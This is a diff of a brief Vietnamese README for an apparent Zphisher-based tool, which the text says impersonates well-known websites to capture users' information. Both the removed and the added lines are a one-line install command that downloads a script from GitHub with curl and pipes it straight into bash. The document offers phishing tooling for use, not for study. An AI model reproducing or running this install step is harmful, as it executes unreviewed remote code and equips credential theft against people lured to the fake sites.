@@ -2,7 +2,7 @@
 Công cụ giả mạo nhiều trang web nổi tiếng để lấy thông tin người dùng
 ### Cài đặt
 ```
-bash <( curl -Ls https://raw.githubusercontent.com/DauDau432/hack-web/main/tool-zphisher )
+bash <( curl -Ls https://raw.githubusercontent.com/DauDau432/Zphisher/main/CD-zphisher)
 ```
 <!-- Zphisher -->
 ### Video demo
